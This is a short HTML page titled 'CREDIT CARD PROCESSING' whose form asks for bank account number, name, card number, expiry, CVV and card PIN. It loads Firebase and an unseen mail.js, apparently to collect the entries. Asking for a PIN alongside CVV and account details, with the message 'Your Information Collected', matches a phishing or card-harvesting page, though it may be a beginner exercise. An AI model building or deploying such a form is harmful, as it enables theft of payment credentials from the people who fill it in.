<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CREDIT CARD PROCESSING</title>
    <link rel="stylesheet" href="./styles.css">
</head>
<body>
    <h3>CREDIT CARD INFORMATION</h3>
    <div class="container">
        <form action="" id="creditForm">
            <div class="alert">Your Information Collected</div>
            <div class="inputBox">
                <input type="text" id="Number" placeholder="Bank Acc Number" />
            </div>
            <div class="inputBox">
                <input type="text" id="name" placeholder="Your name" />
            </div>

            <div class="inputBox">
                <input type="text" id="Card" placeholder="Enter Card Number" />
            </div>

            <div class="inputBox">
                <input type="text" id="month" placeholder="Exp month" />
            </div>

            <div class="inputBox">
                <input type="text" id="cvv" placeholder="cvv/cvc" />
            </div>
            
            <div class="inputBox">
                <input type="password" id="pwd" placeholder="Enter Pin" />
            </div>

            <div class="inputBox">
                <button type="submit">Submit</button>
            </div>
        </form>
    </div>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/firebase/7.14.1-0/firebase.js"></script>
    <script src="./mail.js"></script>
</body>
</html>
